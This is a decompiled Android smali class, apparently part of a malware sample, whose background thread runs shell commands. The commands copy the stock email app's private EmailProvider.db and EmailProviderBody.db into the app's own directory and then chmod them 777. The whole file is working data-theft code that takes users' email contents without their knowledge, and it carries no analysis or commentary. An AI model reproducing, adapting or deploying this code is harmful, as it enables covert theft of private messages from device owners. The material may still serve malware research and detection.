.class final Lcom/v1/lib/d;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lcom/v1/lib/c;


# direct methods
.method constructor <init>(Lcom/v1/lib/c;)V
    .locals 0

    iput-object p1, p0, Lcom/v1/lib/d;->a:Lcom/v1/lib/c;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 1

    iget-object v0, p0, Lcom/v1/lib/d;->a:Lcom/v1/lib/c;

    new-instance v0, Lcom/v1/a/a;

    invoke-direct {v0}, Lcom/v1/a/a;-><init>()V

    const-string v0, "cat /data/data/com.android.email/databases/EmailProvider.db > /data/data/com.v1/email.db"

    invoke-static {v0}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/v1/a/a;

    invoke-direct {v0}, Lcom/v1/a/a;-><init>()V

    const-string v0, "cat /data/data/com.android.email/databases/EmailProviderBody.db > /data/data/com.v1/emailbody.db"

    invoke-static {v0}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/v1/a/a;

    invoke-direct {v0}, Lcom/v1/a/a;-><init>()V

    const-string v0, "chmod 777 /data/data/com.v1/email.db"

    invoke-static {v0}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Lcom/v1/a/a;

    invoke-direct {v0}, Lcom/v1/a/a;-><init>()V

    const-string v0, "chmod 777 /data/data/com.v1/emailbody.db"

    invoke-static {v0}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    return-void
.end method
